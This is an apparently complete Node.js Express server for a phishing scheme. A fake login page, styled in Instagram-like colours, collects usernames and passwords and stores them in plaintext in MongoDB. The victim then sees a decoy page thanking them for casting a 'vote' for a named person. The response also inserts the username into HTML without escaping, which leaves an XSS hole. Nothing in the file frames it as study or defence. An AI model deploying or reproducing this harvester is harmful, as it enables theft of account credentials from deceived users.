const express = require("express");
const mongoose = require("mongoose");
const dotenv = require("dotenv");
const bodyParser = require("body-parser");
const User = require("./models/User"); // adjust the path if needed

dotenv.config();

const app = express();

// Middleware
app.set("view engine", "ejs");
app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log("✅ Connected to MongoDB Atlas");
}).catch(err => {
  console.error("❌ MongoDB connection failed:", err);
});

// Routes
app.get("/", (req, res) => {
  res.render("login"); // views/login.ejs
});

app.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    // Save to MongoDB
    const newUser = new User({ username, password });
    await newUser.save();

    res.send(`
  <div style="
    text-align: center;
    margin-top: 100px;
    font-family: Arial, sans-serif;
    color: #333;
  ">
    <h1 style="font-size: 2.5rem; color: #C13584;">💖 Thank You, ${username}!</h1>
    <p style="font-size: 1.2rem;">Your vote has been cast for <strong style="color:#3897f0;">Tejas K</strong> 🙌</p>
    <p style="margin-top: 30px; font-size: 0.9rem; color: #888;">We appreciate your support.</p>
  </div>
`);
  } catch (err) {
    console.error("❌ Error saving user:", err);
    res.status(500).send("Something went wrong");
  }
});

// Port binding (Render requirement)
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

